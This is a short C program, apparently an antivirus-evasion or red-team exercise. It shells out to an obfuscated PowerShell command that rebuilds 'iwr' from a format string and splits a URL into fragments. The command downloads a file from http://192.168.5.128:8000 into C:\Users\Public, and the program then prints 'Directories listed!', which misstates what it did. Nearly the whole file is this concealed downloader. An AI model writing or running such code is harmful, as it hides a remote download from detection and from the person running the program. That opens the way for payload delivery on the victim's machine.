#include <stdio.h>
#include <stdlib.h>

int main(){
    int test;
    test = system("powershell.exe -c \"& (\\\"{0}{1}{2}\\\" -f 'i','w','r') ([string]::Join('', 'ht','tp',':/','/1','92','.16','8.5','.12','8:8','000','/tes','t.txt')) -OutFile ([char[]](\\\"C:\\\\Users\\\\Public\\\\test.txt\\\") -Join '')\"");
    if (test == 0){
        printf("Directories listed!");}
    else{
        printf("There was an error");
    }
    return 0;
}
